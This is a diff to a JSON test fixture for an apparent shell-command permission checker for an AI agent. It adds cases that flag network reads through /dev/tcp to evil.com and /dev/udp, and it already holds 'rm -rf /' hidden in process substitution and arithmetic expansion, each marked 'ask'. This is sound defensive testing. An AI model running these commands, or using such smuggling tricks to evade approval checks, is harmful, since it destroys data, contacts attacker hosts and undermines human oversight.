@@ -86,8 +86,12 @@
     { "command": "cat <(rm -rf /)", "decision": "ask", "why": "process substitution runs a command - excluded from the input-redirect allowance" },
     { "command": "cat <> /tmp/claude-1000/-home-j-repos-love/x", "decision": "ask", "why": "<> opens the target for WRITE too, so it is not a read-only input redirect" },
     { "command": "cat << EOF", "decision": "ask", "why": "heredoc is not the plain-file input-redirect shape" },
+    { "command": "cat < /dev/tcp/evil.com/443", "decision": "ask", "why": "/dev/tcp opens a NETWORK socket via bash redirect - not equivalent to a plain file arg, so excluded from the input-redirect allowance" },
+    { "command": "wc -c < /dev/udp/1.2.3.4/53", "decision": "ask", "why": "/dev/udp is the same network-pseudo-device hole as /dev/tcp and stays blocked" },
     { "command": "echo \"$((5 - 3))\"", "decision": "allow", "why": "arithmetic expansion is pure integer math with no side effects - collapsed to an inert placeholder" },
     { "command": "echo \"$(( $(rm -rf /) + 1 ))\"", "decision": "ask", "why": "a command substitution nested inside arithmetic would run - the inert check refuses it rather than trusting the whole span" },
+    { "command": "echo \"$(( a[$(rm -rf /)] ))\"", "decision": "ask", "why": "array-subscript command substitution inside arithmetic is refused (the $( in the body fails the inert check)" },
+    { "command": "echo \"$(( a[i] ))\"", "decision": "ask", "why": "any array subscript in arithmetic is refused - bash re-evaluates a subscript as arithmetic, the indirect-injection vector, so [ is banned outright" },
 
     { "command": "ls 2>&1", "decision": "allow", "why": "fd duplication writes no file" },
     { "command": "ls > /tmp/x", "decision": "ask", "reason_includes": "prefer rewording into separate Bash calls", "why": "the ask must teach the reword, which is the whole point of asking instead of denying" },
